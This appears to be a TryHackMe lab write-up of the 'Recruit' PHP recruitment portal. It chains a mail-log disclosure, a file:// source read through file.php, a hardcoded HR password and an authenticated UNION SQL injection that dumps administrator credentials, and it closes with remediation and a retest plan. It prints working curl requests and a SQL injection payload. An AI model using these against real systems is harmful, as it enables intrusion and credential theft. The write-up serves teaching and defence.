---
title: "TryHackMe: Recruit"
date: 2026-06-28 23:50:00 +0200
categories: [TryHackMe]
tags:
  - web
  - php
  - source-disclosure
  - sqli
  - credential-disclosure
  - phpmyadmin
  - session-security
description: >-
  Recruit chained public information disclosure, local PHP source disclosure,
  hardcoded HR credentials, and authenticated SQL injection into administrator
  credential extraction.
author: lenovolegion7
media_subpath: /images/tryhackme_recruit
image:
  path: room_image.webp
  alt: "Original TryHackMe Recruit room artwork"
toc: true
comments: false
---

Recruit is a PHP recruitment portal where several web weaknesses combine into a credential-compromise chain. The validated path moved from public documentation and mail-log disclosure into local PHP source disclosure, recovered HR credentials, authenticated access, and a UNION-based SQL injection that exposed the administrator credential.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Recruit room card](room_card.webp){: w="296" h="268" .shadow }](https://tryhackme.com/room/recruitwebchallenge){: .center }

## Executive Summary

The application was exposed through the virtual host:

```text
recruit.thm
```

The source report confirms a chained attack path:

```text
Public information disclosure
-> exposed mail log
-> local PHP source disclosure
-> hardcoded HR credential
-> authenticated HR access
-> SQL injection in candidate search
-> administrator credential extraction
```

The supplied evidence confirms normal HR access, recovery of the normal-user flag, and extraction of the administrator credential. It does **not** include a completed administrator login or the administrator flag, so this writeup does not claim that final objective as observed evidence.

> **Result:** HR access and administrator credential extraction were confirmed. The final administrator flag was not captured in the supplied evidence.
{: .prompt-danger }

## Initial Enumeration

The target exposed:

```text
22/tcp   SSH
53/tcp   DNS
80/tcp   HTTP
```

The initial scan can be represented without publishing the lab address:

```console
$ nmap -sC -sV -Pn -p22,53,80 TARGET_IP
```

The intended virtual host was:

```text
recruit.thm
```

DNS zone-transfer attempts failed, making web enumeration the main path forward.

## Web Mapping

Content discovery identified:

```text
index.php
api.php
file.php
dashboard.php
mail/
phpmyadmin/
config.php
header.php
footer.php
sitemap.xml
```

The sitemap disclosed several important application paths:

```text
/api.php
/file.php
/mail/
/dashboard.php
/assets/
```

The `/mail/` directory had directory indexing enabled, and `mail.log` was publicly downloadable.

## Mail Log Disclosure

The exposed mail log disclosed two critical implementation details:

- HR credentials were temporarily stored in `config.php`.
- Administrator credentials were stored in the backend database.

This did not expose the credentials directly, but it gave a precise roadmap for exploitation.

## Local PHP Source Disclosure

The API documentation described a CV retrieval endpoint using:

```text
/file.php?cv=
```

Testing showed that `file://` paths under `/var/www/html` could be read directly.

For example:

```console
$ curl \
  'http://recruit.thm/file.php?cv=file:///var/www/html/config.php'
```

The response exposed PHP source containing the HR password:

```php
$HR_PASSWORD = '[REDACTED]';
```

The same primitive also exposed application logic from:

```text
/var/www/html/index.php
/var/www/html/dashboard.php
```

This converted a document-retrieval feature into source-code disclosure.

## HR Authentication

The recovered HR credential allowed successful portal authentication:

```console
$ curl \
  -c web/hr.cookie \
  -X POST \
  http://recruit.thm/index.php \
  -d 'username=hr&password=[REDACTED]&login=Login'
```

The HR dashboard exposed the normal-user objective:

```text
THM{[REDACTED]}
```

This established authenticated access to the vulnerable dashboard functionality.

## Authenticated SQL Injection

The candidate-search feature inserted the `search` value directly into a SQL statement:

```php
$query = "SELECT * FROM candidates WHERE name LIKE '%$search%'";
```

Because the output rendered four columns, a four-column `UNION SELECT` could retrieve data from the `users` table:

```text
x%' UNION ALL SELECT 999,CONCAT(username,0x3a,password),'users','dump' FROM users-- -
```

The resulting output exposed the administrator account:

```text
admin : [REDACTED]
```

This confirmed credential theft from the backend database.

## Administrator Access Status

The source report provides a follow-up validation request using the extracted administrator credential:

```console
$ curl \
  -c web/admin.cookie \
  -X POST \
  http://recruit.thm/index.php \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=[REDACTED]' \
  --data-urlencode 'login=Login'
```

The application code indicates that an authenticated `admin` session reads `/admin.txt`.

However, the supplied terminal evidence did not capture a successful administrator login or the resulting flag.

```text
Administrator credential extraction: confirmed
Administrator flag retrieval: not observed in supplied evidence
```

## Findings

### R-01 - Authenticated SQL Injection in Candidate Search

- **Severity:** Critical
- **Affected component:** `dashboard.php`
- **Impact:** Database disclosure and administrator credential theft

The dashboard search function concatenated user-controlled input directly into a SQL query. An authenticated HR user could inject a `UNION SELECT` and retrieve values from unrelated database tables.

**Remediation:**

- use parameterized queries for all database access;
- remove SQL error details from responses;
- apply server-side authorization checks;
- monitor for anomalous search payloads.

### R-02 - Local Source Disclosure Through `file.php`

- **Severity:** High
- **Affected component:** `/file.php?cv=`
- **Impact:** PHP source disclosure and credential exposure

The CV retrieval endpoint accepted `file://` URLs and permitted reads under `/var/www/html`, exposing application source code.

**Remediation:**

- remove arbitrary local-file retrieval;
- store candidate documents outside the application codebase;
- use allowlisted object identifiers or filenames;
- never return PHP source from the web root.

### R-03 - Hardcoded HR Credential in `config.php`

- **Severity:** High
- **Impact:** Immediate authenticated access after source disclosure

The HR password was stored as a plaintext PHP variable.

**Remediation:**

- rotate the exposed credential;
- use protected environment variables or a secrets manager;
- avoid plaintext reusable credentials in source files.

### R-04 - Public Mail Directory and Log Disclosure

- **Severity:** Medium
- **Affected path:** `/mail/`
- **Impact:** Information disclosure that materially accelerated exploitation

Directory indexing exposed a deployment log that revealed where credentials were stored.

**Remediation:**

- disable directory indexing;
- keep operational logs outside the web root;
- restrict access to deployment and application logs;
- use restrictive file permissions and log rotation.

### R-05 - phpMyAdmin Exposed on the Public Web Service

- **Severity:** Medium
- **Affected path:** `/phpmyadmin/`
- **Impact:** Increased database administration attack surface

A publicly accessible phpMyAdmin installation increases the risk of credential attacks and management-interface exploitation.

**Remediation:**

- remove phpMyAdmin from public production exposure;
- restrict it to a management network or VPN;
- require strong authentication and MFA where possible;
- keep the interface fully patched.

### R-06 - `PHPSESSID` Missing `HttpOnly`

- **Severity:** Low
- **Impact:** Increased session-theft impact if client-side script execution becomes possible

The PHP session cookie did not set the `HttpOnly` attribute.

**Remediation:**

- enable `session.cookie_httponly=1`;
- enable `Secure` when HTTPS is deployed;
- use an appropriate `SameSite` policy;
- deploy TLS for production environments.

## Security Impact

The primary issue was the way the weaknesses compounded.

Public information disclosure provided exploitation guidance. Local source disclosure revealed a reusable credential. That credential unlocked an authenticated SQL injection, which then exposed the administrator credential.

A real-world recruitment system could therefore suffer:

- unauthorized user access;
- database disclosure;
- credential theft;
- exposure of candidate information;
- administrative account compromise.

## Remediation Priorities

1. Fix the authenticated SQL injection with parameterized queries.
2. Disable or redesign the `file.php` local-file retrieval behavior.
3. Rotate HR and administrator credentials.
4. Move credentials out of PHP source files.
5. Remove logs and mail archives from the public web root.
6. Disable directory indexing.
7. Restrict phpMyAdmin to management-only access.
8. Harden session cookies and deploy HTTPS.

## Retest Plan

1. Confirm `file://` payloads can no longer retrieve PHP source files.
2. Verify the HR and administrator passwords have been rotated.
3. Confirm the candidate search rejects SQL injection payloads.
4. Verify unrelated database rows cannot be returned through search functionality.
5. Confirm `/mail/` is no longer browsable and `mail.log` is inaccessible anonymously.
6. Verify phpMyAdmin is removed from the public interface or restricted.
7. Confirm `PHPSESSID` includes `HttpOnly` and appropriate production cookie attributes.
8. Validate administrator authentication and role checks using the rotated credential.

## Lessons Learned

Recruit demonstrates how information disclosure can be just as important as a direct code-execution bug.

The public mail log revealed where to look, the CV retrieval endpoint exposed the source, and the source disclosed the HR credential. Authenticated SQL injection then converted normal user access into administrator credential theft.

The strongest defensive response is to eliminate the chain at multiple layers: protect operational information, prevent source disclosure, remove hardcoded secrets, and parameterize every database query.
